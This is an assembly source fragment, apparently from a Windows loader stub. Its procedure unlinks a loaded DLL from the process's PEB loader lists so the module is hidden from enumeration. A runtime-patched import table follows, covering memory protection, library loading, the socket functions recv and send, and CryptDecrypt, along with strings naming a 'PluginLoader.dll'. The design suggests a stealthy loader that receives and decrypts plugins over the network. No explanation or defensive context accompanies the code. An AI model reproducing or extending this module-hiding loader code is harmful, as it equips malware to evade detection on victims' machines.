proc DelLdrModule,module_node;PLDR_MODULE
endl
	pushad
	mov esi,%$module_node
		
	;//Desbinculo de la lista por orden de carga
	mov ecx,[esi+LDR_MODULE.InLoadOrderModuleList+LIST_ENTRY.Flink]
	mov edx,[esi+LDR_MODULE.InLoadOrderModuleList+LIST_ENTRY.Blink]
	
	mov [ecx+LDR_MODULE.InLoadOrderModuleList+LIST_ENTRY.Blink],edx
	mov [edx+LDR_MODULE.InLoadOrderModuleList+LIST_ENTRY.Flink],ecx
	
	
	;//Desbinculo de la lista por orden de direccion base
	mov ecx,[esi+LDR_MODULE.InMemoryOrderModuleList+LIST_ENTRY.Flink]
	mov edx,[esi+LDR_MODULE.InMemoryOrderModuleList+LIST_ENTRY.Blink]
	
	;//mov [ecx+LDR_MODULE.InMemoryOrderModuleList+LIST_ENTRY.Blink],edx
	;//mov [edx+LDR_MODULE.InMemoryOrderModuleList+LIST_ENTRY.Flink],ecx
			
	
	;//Desbinculo de la lista por orden de inicilizacion
	mov ecx,[esi+LDR_MODULE.InInitializationOrderModuleList+LIST_ENTRY.Flink]
	mov edx,[esi+LDR_MODULE.InInitializationOrderModuleList+LIST_ENTRY.Blink]
	
	;//mov [ecx+LDR_MODULE.InInitializationOrderModuleList+LIST_ENTRY.Blink],edx
	;//mov [edx+LDR_MODULE.InInitializationOrderModuleList+LIST_ENTRY.Flink],ecx
			
	popad
endp
int3
int3
	;//Tabla de salto a funciones externas
FuncTable:
TlsAlloc:
	db 0x68;push 0xffffffff
	dd -1
	ret
TlsSetValue:
	db 0x68;push 0xffffffff
	dd -1
	ret
ExitProcess:
	db 0x68;push 0xffffffff
	dd -1
	ret
VirtualAlloc:
	db 0x68;push 0xffffffff
	dd -1
	ret
VirtualFree:
	db 0x68;push 0xffffffff
	dd -1
	ret
VirtualProtect:
	db 0x68;push 0xffffffff
	dd -1
	ret
LoadLibraryA:
	db 0x68;push 0xffffffff
	dd -1
	ret
GetProcAddress:
	db 0x68;push 0xffffffff
	dd -1
	ret
malloc:
	db 0x68;push 0xffffffff
	dd -1
	ret
realloc:
	db 0x68;push 0xffffffff
	dd -1
	ret
free:
	db 0x68;push 0xffffffff
	dd -1
	ret
;Funciones de red
recv:
	db 0x68;push 0xffffffff
	dd -1
	ret
send:
	db 0x68;push 0xffffffff
	dd -1
	ret
ioctlsocket:
	db 0x68;push 0xffffffff
	dd -1
	ret
;//Funciones de encriptacion
CryptDecrypt:
	db 0x68;push 0xffffffff
	dd -1
	ret
EendOfFuncTable:
	nop
	nop
	nop
	PluginLoaderName	db "PluginLoader.dll",0
	kernel32N			db "kernel32",0
	VirtualAllocN		db "VirtualAlloc",0
	VirtualFreeN		db "VirtualFree",0
	VirtualProtectN		db "VirtualProtect",0
	ExitProcessN		db "ExitProcess",0
	TlsAllocN			db "TlsAlloc",0
	TlsSetValueN		db "TlsSetValue",0
			
	msvcrtN				db "msvcrt",0
	mallocN				db "malloc",0
	reallocN			db "realloc",0
	freeN				db "free",0
	
	ws2_32				db "ws2_32",0
	recvN				db "recv",0
	sendN				db "send",0
	ioctlsocketN		db "ioctlsocket",0	
	
	advapi32N			db "advapi32",0
	CryptDecryptN		db "CryptDecrypt",0
	
			
	dllmain@ 			db "DllMain@12",0
	PluginLoaderEntry	db "InitPluginLoader@12",
	nulo 				db 0;
	
	kernel32FuncTable	dd kernel32N,VirtualAllocN,VirtualAlloc,VirtualFreeN,VirtualFree,VirtualProtectN,VirtualProtect,ExitProcessN,ExitProcess,TlsAllocN,TlsAlloc,TlsSetValueN,TlsSetValue,0
	
	msvcrtFuncTable		dd msvcrtN,mallocN,malloc,reallocN,realloc,freeN,free,0
	
	ws2_32FuncTable		dd ws2_32,recvN,recv,sendN,send,ioctlsocketN,ioctlsocket,0
	
	advapi32FuncTable	dd advapi32N,CryptDecryptN,CryptDecrypt,0
EOF:
